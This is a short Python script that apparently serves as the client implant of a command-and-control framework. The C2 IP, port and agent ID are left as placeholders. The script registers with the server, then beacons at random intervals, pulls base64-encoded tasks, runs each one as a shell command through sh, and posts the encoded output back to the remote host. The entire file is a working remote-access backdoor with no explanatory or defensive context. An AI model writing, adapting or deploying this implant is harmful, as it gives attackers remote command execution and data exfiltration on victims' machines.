import requests as r 
from base64 import b64encode
from random import seed
from random import randint
from time import sleep
import os

_IP_ = 'REPLACE_IP'
_PORT_ = 'REPLACE_PORT'
_ID_ = 'REPLACE_ID' 



if __name__ == "__main__": 

    _C2_ = "http://{}:{}".format(_IP_,_PORT_)    
    #Start Registration 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        response = r.post(url= _C2_ + "/reg/{}".format(_ID_)) 
        print(response.text)
        
        if ("Success" in response.text): 
            break 
        
        else: 
            continue 
    
    #Start Beaconing 
    while (True): 
        seed()
        sleep(randint(0,20)) 
        task = r.get(url= _C2_ + "/task/{}".format(_ID_)) 
        
        if (task.text != '0'): 
            result = os.popen('echo "{}" | base64 -d | sh'.format(task.text)).read()
            
            if (result == ''): 
                result = "Task completed but has no output"
            
            r.post(url= _C2_ + '/task/results/{}'.format(_ID_), data= {'results': b64encode(result.encode())}) 
            
        else: 
            continue